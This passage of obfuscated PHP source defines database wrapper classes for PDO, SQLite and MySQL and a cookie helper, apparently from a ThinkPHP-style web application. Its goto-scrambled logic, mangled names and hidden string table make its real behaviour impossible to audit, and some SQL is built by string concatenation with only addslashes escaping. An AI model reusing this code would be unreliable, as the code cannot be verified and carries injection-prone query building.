<?php
 goto BÕ®¥Û²³; b‡æäÒÄ¯ó: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÅŒµâÖ = '') { $¤ñÇ½ =& $_SERVER[‰‰Ş‚€]; if (!class_exists($¤ñÇ½[1024])) { think_exception(think_lang($¤ñÇ½[24]) . $¤ñÇ½[1025]); } if (!empty($ÅŒµâÖ)) { $this->config = $ÅŒµâÖ; if (empty($this->config[$¤ñÇ½[27]])) { $this->config[$¤ñÇ½[27]] = array(); } } } public function connect($àŒÜÖ ç = '', $•öçŸ´ = 0) { $¬š¬£“ =& $_SERVER[‰‰Ş‚€]; if (!isset($this->linkID[$•öçŸ´])) { if (empty($àŒÜÖ ç)) { $àŒÜÖ ç = $this->config; } $êÉ…´Ù = !empty($àŒÜÖ ç[$¬š¬£“[27]][$¬š¬£“[28]]) ? $àŒÜÖ ç[$¬š¬£“[27]][$¬š¬£“[28]] : $this->pconnect; if ($êÉ…´Ù) { $àŒÜÖ ç[$¬š¬£“[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$•öçŸ´] = new PDO($àŒÜÖ ç[$¬š¬£“[1026]], $àŒÜÖ ç[$¬š¬£“[995]], $àŒÜÖ ç[$¬š¬£“[996]], $àŒÜÖ ç[$¬š¬£“[27]]); } catch (PDOException $ƒü¼ãé¾) { think_exception($ƒü¼ãé¾->getMessage()); } $this->dbType = $this->_getDsnType($àŒÜÖ ç[$¬š¬£“[1026]]); if (in_array($this->dbType, array($¬š¬£“[1027], $¬š¬£“[1028], $¬š¬£“[1029], $¬š¬£“[1030]))) { think_exception($¬š¬£“[1031] . $this->dbType . $¬š¬£“[1032] . $this->dbType . $¬š¬£“[1033]); } if (!$this->linkID[$•öçŸ´]) { think_exception($¬š¬£“[1034]); } try { $this->linkID[$•öçŸ´]->exec($¬š¬£“[1035] . think_config($¬š¬£“[998])); } catch (Exception $ƒü¼ãé¾) { } $this->connected = !0; if (1 != think_config($¬š¬£“[32])) { unset($this->config); } } return $this->linkID[$•öçŸ´]; } public function free() { $this->PDOStatement = null; } public function query($ÉÄÑş, $ºËø§®Í = array()) { $‚ü¢×³¢ =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉÄÑş; if (!empty($ºËø§®Í)) { $this->queryStr .= $‚ü¢×³¢[1036] . print_r($ºËø§®Í, !0) . $‚ü¢×³¢[1037]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‚ü¢×³¢[33], 1); think_status($‚ü¢×³¢[34]); $this->PDOStatement = $this->_linkID->prepare($ÉÄÑş); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¨•º°ìß = $this->PDOStatement->execute($ºËø§®Í); $this->debug(); if (!1 === $¨•º°ìß) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ı„¸îÂ, $ş÷ëçª  = array()) { $ê›Ó÷ÃÆ =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ı„¸îÂ; if (!empty($ş÷ëçª )) { $this->queryStr .= $ê›Ó÷ÃÆ[1036] . print_r($ş÷ëçª , !0) . $ê›Ó÷ÃÆ[1037]; } $á–Ÿ´ë© = !1; if ($this->dbType == $ê›Ó÷ÃÆ[1030]) { if (preg_match($ê›Ó÷ÃÆ[1038], $this->queryStr, $ˆ¸Ò›×ë)) { $this->table = think_config($ê›Ó÷ÃÆ[1039]) . str_ireplace(think_config($ê›Ó÷ÃÆ[1040]), $ê›Ó÷ÃÆ[471], $ˆ¸Ò›×ë[2]); $á–Ÿ´ë© = (bool) $this->query($ê›Ó÷ÃÆ[1041] . strtoupper($this->table) . $ê›Ó÷ÃÆ[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ê›Ó÷ÃÆ[35], 1); think_status($ê›Ó÷ÃÆ[34]); $this->PDOStatement = $this->_linkID->prepare($ı„¸îÂ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $’é‘‚¢ = $this->PDOStatement->execute($ş÷ëçª ); $this->debug(); if (!1 === $’é‘‚¢) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($á–Ÿ´ë© || preg_match($ê›Ó÷ÃÆ[1042], $ı„¸îÂ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÜÓŞí‰È = $this->_linkID->commit(); $this->transTimes = 0; if (!$ÜÓŞí‰È) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $õõûåŒ² = $this->_linkID->rollback(); $this->transTimes = 0; if (!$õõûåŒ²) { $this->error(); return !1; } } return !0; } private function getAll() { $ª Úù³ê = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ª Úù³ê); return $ª Úù³ê; } public function getFields($¹é­İ—“) { $’ğÍ…·Ñ =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!0); if (think_config($’ğÍ…·Ñ[1043])) { $Ø¼™ô—Œ = str_replace($’ğÍ…·Ñ[1044], $¹é­İ—“, think_config($’ğÍ…·Ñ[1043])); } else { switch ($this->dbType) { case $’ğÍ…·Ñ[1027]: case $’ğÍ…·Ñ[1045]: $Ø¼™ô—Œ = "\123\x45\x4c\105\x43\x54\40\x20\x20\143\157\154\165\x6d\156\x5f\x6e\141\155\x65\40\x61\x73\x20\47\116\x61\x6d\145\47\54\40\x20\x20\x64\141\x74\x61\x5f\164\x79\x70\x65\x20\141\x73\x20\47\124\x79\x70\x65\47\54\x20\x20\x20\x63\x6f\x6c\x75\155\x6e\137\x64\145\146\141\x75\x6c\x74\40\141\163\x20\47\x44\145\146\141\165\x6c\x74\x27\x2c\x20\x20\40\x69\163\x5f\x6e\x75\154\154\141\x62\154\145\40\x61\x73\x20\x27\x4e\x75\x6c\x6c\x27\xa\x9\x9\x46\x52\117\x4d\x9\x69\156\146\x6f\x72\x6d\141\x74\151\x6f\x6e\137\163\143\150\145\x6d\141\x2e\164\x61\x62\154\x65\x73\x20\101\123\40\164\xa\11\x9\112\x4f\111\x4e\11\151\156\x66\157\x72\x6d\x61\164\151\x6f\x6e\137\x73\x63\x68\x65\155\141\56\143\157\x6c\165\155\x6e\163\x20\x41\x53\40\143\12\11\x9\117\116\x20\x20\164\x2e\x74\x61\142\154\145\137\143\x61\164\141\154\157\x67\x20\75\40\x63\56\164\141\142\154\x65\137\143\x61\164\141\154\157\147\xa\x9\x9\x41\116\x44\x20\x74\x2e\164\141\x62\154\145\x5f\163\x63\x68\145\x6d\x61\x20\x3d\x20\x63\56\x74\141\142\154\x65\x5f\x73\143\x68\145\155\x61\12\11\x9\x41\116\104\x20\x74\56\164\141\x62\154\x65\x5f\156\141\155\145\x20\75\x20\x63\x2e\164\141\x62\x6c\x65\x5f\x6e\141\155\x65\12\11\x9\x57\x48\x45\x52\105\40\x20\x20\x74\x2e\x74\x61\142\154\145\137\156\x61\x6d\145\40\x3d\x20\x27{$¹é­İ—“}\47"; break; case $’ğÍ…·Ñ[1046]: $Ø¼™ô—Œ = $’ğÍ…·Ñ[1047] . $¹é­İ—“ . $’ğÍ…·Ñ[1048]; break; case $’ğÍ…·Ñ[1028]: case $’ğÍ…·Ñ[1030]: $Ø¼™ô—Œ = $’ğÍ…·Ñ[1049] . $’ğÍ…·Ñ[1050] . $’ğÍ…·Ñ[1051] . strtoupper($¹é­İ—“) . $’ğÍ…·Ñ[1052] . strtoupper($¹é­İ—“) . $’ğÍ…·Ñ[1053]; break; case $’ğÍ…·Ñ[1054]: $Ø¼™ô—Œ = $’ğÍ…·Ñ[1055] . $¹é­İ—“ . $’ğÍ…·Ñ[1056]; break; case $’ğÍ…·Ñ[1029]: break; case $’ğÍ…·Ñ[1057]: default: $Ø¼™ô—Œ = $’ğÍ…·Ñ[1058] . ($this->dbType == $’ğÍ…·Ñ[1057] ? "\x60{$¹é­İ—“}\x60" : $¹é­İ—“); } } $´æ©úë = $this->query($Ø¼™ô—Œ); $¸ì¬ªú¢ = array(); if ($´æ©úë) { foreach ($´æ©úë as $¤ášô©Š => $ö‡€îô²) { $ö‡€îô² = array_change_key_case($ö‡€îô²); $ö‡€îô²[$’ğÍ…·Ñ[42]] = isset($ö‡€îô²[$’ğÍ…·Ñ[42]]) ? $ö‡€îô²[$’ğÍ…·Ñ[42]] : $’ğÍ…·Ñ[471]; $ö‡€îô²[$’ğÍ…·Ñ[43]] = isset($ö‡€îô²[$’ğÍ…·Ñ[43]]) ? $ö‡€îô²[$’ğÍ…·Ñ[43]] : $’ğÍ…·Ñ[471]; $÷ğ‰ãÊÀ = isset($ö‡€îô²[$’ğÍ…·Ñ[360]]) ? $ö‡€îô²[$’ğÍ…·Ñ[360]] : $ö‡€îô²[$’ğÍ…·Ñ[42]]; $¸ì¬ªú¢[$÷ğ‰ãÊÀ] = array($’ğÍ…·Ñ[42] => $÷ğ‰ãÊÀ, $’ğÍ…·Ñ[43] => $ö‡€îô²[$’ğÍ…·Ñ[43]], $’ğÍ…·Ñ[45] => (bool) (isset($ö‡€îô²[$’ğÍ…·Ñ[114]]) && $ö‡€îô²[$’ğÍ…·Ñ[114]] === $’ğÍ…·Ñ[22] || isset($ö‡€îô²[$’ğÍ…·Ñ[45]]) && $ö‡€îô²[$’ğÍ…·Ñ[45]] === $’ğÍ…·Ñ[22]), $’ğÍ…·Ñ[47] => isset($ö‡€îô²[$’ğÍ…·Ñ[47]]) ? $ö‡€îô²[$’ğÍ…·Ñ[47]] : (isset($ö‡€îô²[$’ğÍ…·Ñ[66]]) ? $ö‡€îô²[$’ğÍ…·Ñ[66]] : $’ğÍ…·Ñ[471]), $’ğÍ…·Ñ[49] => isset($ö‡€îô²[$’ğÍ…·Ñ[105]]) ? strtolower($ö‡€îô²[$’ğÍ…·Ñ[105]]) == $’ğÍ…·Ñ[51] : (isset($ö‡€îô²[$’ğÍ…·Ñ[67]]) ? $ö‡€îô²[$’ğÍ…·Ñ[67]] : !1), $’ğÍ…·Ñ[52] => isset($ö‡€îô²[$’ğÍ…·Ñ[1059]]) ? strtolower($ö‡€îô²[$’ğÍ…·Ñ[1059]]) == $’ğÍ…·Ñ[54] : (isset($ö‡€îô²[$’ğÍ…·Ñ[105]]) ? $ö‡€îô²[$’ğÍ…·Ñ[105]] : !1)); } } return $¸ì¬ªú¢; } public function getTables($ş¨ÎÌ™ô = '') { $¬­ÓÍŸõ =& $_SERVER[‰‰Ş‚€]; if (think_config($¬­ÓÍŸõ[1060])) { $Æ§Ç¤ø“ = str_replace($¬­ÓÍŸõ[1061], $ş¨ÎÌ™ô, think_config($¬­ÓÍŸõ[1060])); } else { switch ($this->dbType) { case $¬­ÓÍŸõ[1028]: case $¬­ÓÍŸõ[1030]: $Æ§Ç¤ø“ = $¬­ÓÍŸõ[1062]; break; case $¬­ÓÍŸõ[1027]: case $¬­ÓÍŸõ[1045]: $Æ§Ç¤ø“ = $¬­ÓÍŸõ[1063]; break; case $¬­ÓÍŸõ[1054]: $Æ§Ç¤ø“ = $¬­ÓÍŸõ[1064]; break; case $¬­ÓÍŸõ[1029]: think_exception(think_lang($¬­ÓÍŸõ[1065]) . $¬­ÓÍŸõ[1066]); break; case $¬­ÓÍŸõ[1046]: $Æ§Ç¤ø“ = $¬­ÓÍŸõ[55] . $¬­ÓÍŸõ[56] . $¬­ÓÍŸõ[57]; break; case $¬­ÓÍŸõ[1057]: default: if (!empty($ş¨ÎÌ™ô)) { $Æ§Ç¤ø“ = $¬­ÓÍŸõ[1006] . $ş¨ÎÌ™ô . $¬­ÓÍŸõ[1007]; } else { $Æ§Ç¤ø“ = $¬­ÓÍŸõ[1008]; } } } $Úã®™æ = $this->query($Æ§Ç¤ø“); $¥‹ä£¯ = array(); foreach ($Úã®™æ as $õ´ïëŞœ => $ØÒ®¶) { $¥‹ä£¯[$õ´ïëŞœ] = current($ØÒ®¶); } return $¥‹ä£¯; } protected function parseLimit($¢€†±¾Ä) { $À‰üİ¸Ë =& $_SERVER[‰‰Ş‚€]; $•¹ÓŒ½ = $À‰üİ¸Ë[22]; if (!empty($¢€†±¾Ä)) { switch ($this->dbType) { case $À‰üİ¸Ë[1054]: case $À‰üİ¸Ë[1046]: $¢€†±¾Ä = explode($À‰üİ¸Ë[60], $¢€†±¾Ä); if (count($¢€†±¾Ä) > 1) { $•¹ÓŒ½ .= $À‰üİ¸Ë[61] . $¢€†±¾Ä[1] . $À‰üİ¸Ë[62] . $¢€†±¾Ä[0] . $À‰üİ¸Ë[63]; } else { $•¹ÓŒ½ .= $À‰üİ¸Ë[61] . $¢€†±¾Ä[0] . $À‰üİ¸Ë[63]; } break; case $À‰üİ¸Ë[1027]: case $À‰üİ¸Ë[1045]: break; case $À‰üİ¸Ë[1029]: break; case $À‰üİ¸Ë[1028]: case $À‰üİ¸Ë[1030]: break; case $À‰üİ¸Ë[1057]: default: $•¹ÓŒ½ .= $À‰üİ¸Ë[61] . $¢€†±¾Ä . $À‰üİ¸Ë[63]; } } return $•¹ÓŒ½; } public function parseKey(&$Æ‹óİÈÃ, $¶ğïëğŸ = true) { $Ç½çÃ£“ =& $_SERVER[‰‰Ş‚€]; if ($¶ğïëğŸ) { $Æ‹óİÈÃ = $this->parseKeyCheck($Æ‹óİÈÃ); } if ($this->dbType == $Ç½çÃ£“[1057]) { if ($Æ‹óİÈÃ != $Ç½çÃ£“[231] && !preg_match($Ç½çÃ£“[1021], $Æ‹óİÈÃ)) { $Æ‹óİÈÃ = $Ç½çÃ£“[480] . trim($Æ‹óİÈÃ, $Ç½çÃ£“[480]) . $Ç½çÃ£“[480]; } return $Æ‹óİÈÃ; } else { return parent::parseKey($Æ‹óİÈÃ, $¶ğïëğŸ); } } public function close() { $this->_linkID = null; } public function error() { $Ü¤ï†‡ =& $_SERVER[‰‰Ş‚€]; if ($this->PDOStatement) { $†İÈÚË¢ = $this->PDOStatement->errorInfo(); $this->error = $†İÈÚË¢[1] . $Ü¤ï†‡[14] . $†İÈÚË¢[2]; } else { $this->error = $Ü¤ï†‡[22]; } if ($Ü¤ï†‡[22] != $this->queryStr) { $this->error .= LNG($Ü¤ï†‡[58]) . $this->queryStr; } think_trace($this->error, $Ü¤ï†‡[22], $Ü¤ï†‡[59]); return $this->error; } public function escapeString($ËíÈ¼ï‘) { $È‰„·˜ =& $_SERVER[‰‰Ş‚€]; switch ($this->dbType) { case $È‰„·˜[1054]: case $È‰„·˜[1027]: case $È‰„·˜[1045]: case $È‰„·˜[1057]: return addslashes($ËíÈ¼ï‘); case $È‰„·˜[1029]: case $È‰„·˜[1046]: case $È‰„·˜[1028]: case $È‰„·˜[1030]: return str_ireplace($È‰„·˜[68], $È‰„·˜[69], $ËíÈ¼ï‘); } } protected function parseValue($¦’Òı­ì) { $…¬Øé¡• =& $_SERVER[‰‰Ş‚€]; if (is_string($¦’Òı­ì)) { $ßŞêÛœ« = strpos($¦’Òı­ì, $…¬Øé¡•[14]) === 0 && in_array($¦’Òı­ì, array_keys($this->bind)); $¦’Òı­ì = $ßŞêÛœ« ? $this->escapeString($¦’Òı­ì) : $…¬Øé¡•[1067] . $this->escapeString($¦’Òı­ì) . $…¬Øé¡•[1067]; } elseif (isset($¦’Òı­ì[0]) && is_string($¦’Òı­ì[0]) && strtolower($¦’Òı­ì[0]) == $…¬Øé¡•[381]) { $¦’Òı­ì = $this->escapeString($¦’Òı­ì[1]); } elseif (is_array($¦’Òı­ì)) { $¦’Òı­ì = array_map(array($this, $…¬Øé¡•[1068]), $¦’Òı­ì); } elseif (is_bool($¦’Òı­ì)) { $¦’Òı­ì = $¦’Òı­ì ? $…¬Øé¡•[101] : $…¬Øé¡•[239]; } elseif (is_null($¦’Òı­ì)) { $¦’Òı­ì = $…¬Øé¡•[114]; } return $¦’Òı­ì; } public function getLastInsertId() { $˜Å¦¥Šô =& $_SERVER[‰‰Ş‚€]; switch ($this->dbType) { case $˜Å¦¥Šô[1054]: case $˜Å¦¥Šô[1046]: case $˜Å¦¥Šô[1027]: case $˜Å¦¥Šô[1045]: case $˜Å¦¥Šô[1029]: case $˜Å¦¥Šô[1057]: return $this->_linkID->lastInsertId(); case $˜Å¦¥Šô[1028]: case $˜Å¦¥Šô[1030]: $¦÷½ı› = $this->table; $©œÎ£éü = $this->query("\123\105\114\105\x43\124\40{$¦÷½ı›}\56\x63\x75\162\x72\x76\141\x6c\x20\x63\x75\162\x72\166\141\154\x20\x46\x52\117\x4d\x20\x64\x75\x61\154"); return $©œÎ£éü ? $©œÎ£éü[0][$˜Å¦¥Šô[1069]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Ğ¹ªŞ½µ) { $‚ƒõ©£ì =& $_SERVER[‰‰Ş‚€]; if (!CacheLock::fileLock($‚ƒõ©£ì[23])) { return !1; } $ÄÜÇıË„ = parent::query($Ğ¹ªŞ½µ); CacheLock::fileUnLock($‚ƒõ©£ì[23]); return $ÄÜÇıË„; } public function execute($í—‹®‹) { $‹ŠÖ–¿ =& $_SERVER[‰‰Ş‚€]; if (!CacheLock::fileLock($‹ŠÖ–¿[23])) { return !1; } $½µ«“ = parent::execute($í—‹®‹); CacheLock::fileUnLock($‹ŠÖ–¿[23]); return $½µ«“; } } class DbSqlite3 extends DbSqlite3Base { public function query($†÷®ø²ó) { $ò·Ö°½ò =& $_SERVER[‰‰Ş‚€]; if (!CacheLock::fileLock($ò·Ö°½ò[23])) { return !1; } $Ş“Œ¬ğ = parent::query($†÷®ø²ó); CacheLock::fileUnLock($ò·Ö°½ò[23]); return $Ş“Œ¬ğ; } public function execute($ÀàüÕè´) { $İß…¹èï =& $_SERVER[‰‰Ş‚€]; if (!CacheLock::fileLock($İß…¹èï[23])) { return !1; } $˜…„ñ† = parent::execute($ÀàüÕè´); CacheLock::fileUnLock($İß…¹èï[23]); return $˜…„ñ†; } } goto bÕ“«Ÿ§œ; DÃ‚éŠ¬Ì˜: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÚÕÂ»Ÿ– = '', $¡Òºïñ = 0) { if (is_string($ÚÕÂ»Ÿ–) && $ÚÕÂ»Ÿ– != $_SERVER[‰‰Ş‚€][22]) { $this->prefix = $ÚÕÂ»Ÿ–; } if (is_numeric($¡Òºïñ) && $¡Òºïñ > 0) { $this->expire = $¡Òºïñ; } } public static function getInstance() { static $Ÿ†²„åó; if ($Ÿ†²„åó === null) { $Ÿ†²„åó = new self(); } return $Ÿ†²„åó; } private static $cookieDisable = false; public static function disable($ê§è»›) { self::$cookieDisable = $ê§è»›; } private static $sameCookieSet = array(); public static function set($òÁ……Ü…, $¿×íòÉü, $©œã¹¸† = 0, $Òô´…„ğ = false, $ô×¬Êæä = false) { $§şÒ™Ë« =& $_SERVER[‰‰Ş‚€]; if (self::$cookieDisable) { return; } if (!$©œã¹¸†) { $©œã¹¸† = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$òÁ……Ü…]) && self::$sameCookieSet[$òÁ……Ü…] == $¿×íòÉü . $©œã¹¸†) { return; } self::$sameCookieSet[$òÁ……Ü…] = $¿×íòÉü . $©œã¹¸†; if (!$ô×¬Êæä) { $ô×¬Êæä = str_replace(HOST, $§şÒ™Ë«[22], APP_HOST); $ô×¬Êæä = _get($GLOBALS, $§şÒ™Ë«[990], $ô×¬Êæä); } $âÌÛÃÎ² = $§şÒ™Ë«[22]; setcookie($òÁ……Ü…, $¿×íòÉü, time() + $©œã¹¸†, $§şÒ™Ë«[18] . trim($ô×¬Êæä, $§şÒ™Ë«[18]) . $âÌÛÃÎ², !1, !1, $Òô´…„ğ); } public static function setSafe($İ“Öıæë, $òÍ—Å…‚, $âÆÑ¤í« = 0) { self::set($İ“Öıæë, $òÍ—Å…‚, $âÆÑ¤í«, !0); } public static function get($˜Š’ÔÀŸ) { static $÷øÔÆ¥÷ = false; if (!$÷øÔÆ¥÷) { self::initHeaderCookie(); $÷øÔÆ¥÷ = !0; } return isset($_COOKIE[$˜Š’ÔÀŸ]) ? $_COOKIE[$˜Š’ÔÀŸ] : !1; } private static function initHeaderCookie() { $åéí™†³ =& $_SERVER[‰‰Ş‚€]; if (!isset($_SERVER[$åéí™†³[991]]) || !$_SERVER[$åéí™†³[991]]) { return; } $¸ÚöÍ÷ô = explode($åéí™†³[84], $_SERVER[$åéí™†³[991]]); foreach ($¸ÚöÍ÷ô as $‡ú©¬€Ş) { $‡ú©¬€Ş = explode($åéí™†³[472], $‡ú©¬€Ş); if (count($‡ú©¬€Ş) != 2 || !isset($‡ú©¬€Ş[1])) { continue; } $_COOKIE[trim($‡ú©¬€Ş[0])] = trim($‡ú©¬€Ş[1]); } } public static function remove($Ë˜ßĞÏ¯, $›Üå†óã = false) { unset($_COOKIE[$Ë˜ßĞÏ¯]); self::set($Ë˜ßĞÏ¯, $_SERVER[‰‰Ş‚€][22], 1, $›Üå†óã); } } class DbMysql extends Db { public function __construct($§®şûı© = '') { $µşê£Ş— =& $_SERVER[‰‰Ş‚€]; if (!extension_loaded($µşê£Ş—[907])) { think_exception(think_lang($µşê£Ş—[24]) . $µşê£Ş—[992]); } if (!empty($§®şûı©)) { $this->config = $§®şûı©; if (empty($this->config[$µşê£Ş—[27]])) { $this->config[$µşê£Ş—[27]] = $µşê£Ş—[22]; } } } public function connect($ÊÜÑ«²• = '', $ŒŞÒ‹­Ë = 0, $İ”ÏæÊ = false) { $ìÃ“’—´ =& $_SERVER[‰‰Ş‚€]; if (!isset($this->linkID[$ŒŞÒ‹­Ë])) { if (empty($ÊÜÑ«²•)) { $ÊÜÑ«²• = $this->config; } $ëù¶ã–‘ = $ÊÜÑ«²•[$ìÃ“’—´[993]] . ($ÊÜÑ«²•[$ìÃ“’—´[994]] ? "\72{$ÊÜÑ«²•[$ìÃ“’—´[994]]}" : $ìÃ“’—´[22]); $ö¼ï÷¿ = !empty($ÊÜÑ«²•[$ìÃ“’—´[27]][$ìÃ“’—´[28]]) ? $ÊÜÑ«²•[$ìÃ“’—´[27]][$ìÃ“’—´[28]] : $this->pconnect; if ($ö¼ï÷¿) { $this->linkID[$ŒŞÒ‹­Ë] = mysql_pconnect($ëù¶ã–‘, $ÊÜÑ«²•[$ìÃ“’—´[995]], $ÊÜÑ«²•[$ìÃ“’—´[996]], 131072); } else { $this->linkID[$ŒŞÒ‹­Ë] = mysql_connect($ëù¶ã–‘, $ÊÜÑ«²•[$ìÃ“’—´[995]], $ÊÜÑ«²•[$ìÃ“’—´[996]], !0, 131072); } if (!$this->linkID[$ŒŞÒ‹­Ë] || !empty($ÊÜÑ«²•[$ìÃ“’—´[31]]) && !mysql_select_db($ÊÜÑ«²•[$ìÃ“’—´[31]], $this->linkID[$ŒŞÒ‹­Ë])) { think_exception(mysql_error()); } $à€ìÁ‰š = mysql_get_server_info($this->linkID[$ŒŞÒ‹­Ë]); mysql_query($ìÃ“’—´[997] . think_config($ìÃ“’—´[998]) . $ìÃ“’—´[68], $this->linkID[$ŒŞÒ‹­Ë]); if ($à€ìÁ‰š > $ìÃ“’—´[999]) { mysql_query($ìÃ“’—´[1000], $this->linkID[$ŒŞÒ‹­Ë]); } $this->connected = !0; if (1 != think_config($ìÃ“’—´[32])) { unset($this->config); } } return $this->linkID[$ŒŞÒ‹­Ë]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($İµ÷¤Ÿ²) { $¾›ª =& $_SERVER[‰‰Ş‚€]; if (0 === stripos($İµ÷¤Ÿ², $¾›ª[351])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $İµ÷¤Ÿ²; if ($this->queryID) { $this->free(); } think_action_status($¾›ª[33], 1); think_status($¾›ª[34]); $this->queryID = mysql_query($İµ÷¤Ÿ², $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ûôó±Ì€) { $Œñ„´¸ =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ûôó±Ì€; if ($this->queryID) { $this->free(); } think_action_status($Œñ„´¸[35], 1); think_status($Œñ„´¸[34]); $ô¸»Ÿı = mysql_query($ûôó±Ì€, $this->_linkID); $this->debug(); if (!1 === $ô¸»Ÿı) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[‰‰Ş‚€][1001], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…İÓ°ÍĞ = mysql_query($_SERVER[‰‰Ş‚€][1002], $this->_linkID); $this->transTimes = 0; if (!$…İÓ°ÍĞ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ò¸ŠÅÆ¨ = mysql_query($_SERVER[‰‰Ş‚€][1003], $this->_linkID); $this->transTimes = 0; if (!$ò¸ŠÅÆ¨) { $this->error(); return !1; } } return !0; } private function getAll() { $Â’¶ŸèÙ = array(); if ($this->numRows > 0) { while ($Íëí•¿ğ = mysql_fetch_assoc($this->queryID)) { $Â’¶ŸèÙ[] = $Íëí•¿ğ; } mysql_data_seek($this->queryID, 0); } return $Â’¶ŸèÙ; } public function getFields($ÒŸœµı²) { $ğïŸŒä– =& $_SERVER[‰‰Ş‚€]; $ÏıÁŸ¬ˆ = $this->query($ğïŸŒä–[1004] . $this->parseKey($ÒŸœµı²)); $å—§ÇçÜ = array(); if ($ÏıÁŸ¬ˆ) { foreach ($ÏıÁŸ¬ˆ as $šÇ£È£œ => $ŠÂáš¹) { $å—§ÇçÜ[$ŠÂáš¹[$ğïŸŒä–[41]]] = array($ğïŸŒä–[42] => $ŠÂáš¹[$ğïŸŒä–[41]], $ğïŸŒä–[43] => $ŠÂáš¹[$ğïŸŒä–[44]], $ğïŸŒä–[45] => (bool) (strtoupper($ŠÂáš¹[$ğïŸŒä–[46]]) === $ğïŸŒä–[1005]), $ğïŸŒä–[47] => $ŠÂáš¹[$ğïŸŒä–[48]], $ğïŸŒä–[49] => strtolower($ŠÂáš¹[$ğïŸŒä–[50]]) == $ğïŸŒä–[51], $ğïŸŒä–[52] => strtolower($ŠÂáš¹[$ğïŸŒä–[53]]) == $ğïŸŒä–[54]); } } return $å—§ÇçÜ; } public function getTables($‰à¹Á¥Œ = '') { $¨Ìıèõ£ =& $_SERVER[‰‰Ş‚€]; if (!empty($‰à¹Á¥Œ)) { $­åãİËÂ = $¨Ìıèõ£[1006] . $‰à¹Á¥Œ . $¨Ìıèõ£[1007]; } else { $­åãİËÂ = $¨Ìıèõ£[1008]; } $»åğé‰© = $this->query($­åãİËÂ); $‡¥ôÑùÜ = array(); foreach ($»åğé‰© as $¬«ìÍ½ß => $ĞØ™Šƒ¿) { $‡¥ôÑùÜ[$¬«ìÍ½ß] = current($ĞØ™Šƒ¿); } return $‡¥ôÑùÜ; } public function replace($ŞİòäÜ, $úÛÆÀ•« = array()) { $Îù”ÂŞ =& $_SERVER[‰‰Ş‚€]; foreach ($ŞİòäÜ as $ÓÏ¥¯§‡ => $¸÷šØÔ) { $ş¦†„¯° = $this->parseValue($¸÷šØÔ); if (is_scalar($ş¦†„¯°)) { $°¿àÛúè[] = $ş¦†„¯°; $°€•”È¥[] = $this->parseKey($ÓÏ¥¯§‡); } } $ÊÅğ´«± = $Îù”ÂŞ[1009] . $this->parseTable($úÛÆÀ•«[$Îù”ÂŞ[366]]) . $Îù”ÂŞ[1010] . implode($Îù”ÂŞ[60], $°€•”È¥) . $Îù”ÂŞ[1011] . implode($Îù”ÂŞ[60], $°¿àÛúè) . $Îù”ÂŞ[1012]; return $this->execute($ÊÅğ´«±); } public function insertAll($ùÑ³¸Ş¨, $½óóîê = array(), $Õâñ¨ËÙ = false) { $ıü¹Ûª =& $_SERVER[‰‰Ş‚€]; if (!is_array($ùÑ³¸Ş¨[0])) { return !1; } $Ş×éØÂ = array_keys($ùÑ³¸Ş¨[0]); $ÛÛãœİ = array(); foreach ($ùÑ³¸Ş¨ as $¬ş‚—…Ë) { $…îƒÂÄ = array(); foreach ($¬ş‚—…Ë as $Í¿¯…¾Ş => $ÈúØıÏˆ) { $ÈúØıÏˆ = $this->parseValue($ÈúØıÏˆ); if (is_scalar($ÈúØıÏˆ)) { $…îƒÂÄ[] = $ÈúØıÏˆ; } } $ÛÛãœİ[] = $ıü¹Ûª[347] . implode($ıü¹Ûª[60], $…îƒÂÄ) . $ıü¹Ûª[1012]; } array_walk($Ş×éØÂ, array($this, $ıü¹Ûª[1013])); $›Ä—ç = $Õâñ¨ËÙ ? $ıü¹Ûª[1014] : $ıü¹Ûª[1015]; $›Ä—ç = $ıü¹Ûª[1015]; $ÂÜŒå³£ = $›Ä—ç . $ıü¹Ûª[1016] . $this->parseTable($½óóîê[$ıü¹Ûª[366]]) . $ıü¹Ûª[1010] . implode($ıü¹Ûª[60], $Ş×éØÂ) . $ıü¹Ûª[1017] . implode($ıü¹Ûª[60], $ÛÛãœİ); if ($Õâñ¨ËÙ) { $·ôÈ¹üÙ = array(); foreach ($Ş×éØÂ as $Í¿¯…¾Ş) { if ($Í¿¯…¾Ş == $ıü¹Ûª[242] || $Í¿¯…¾Ş == $ıü¹Ûª[1018]) { continue; } $·ôÈ¹üÙ[] = $Í¿¯…¾Ş . $ıü¹Ûª[1019] . $Í¿¯…¾Ş . 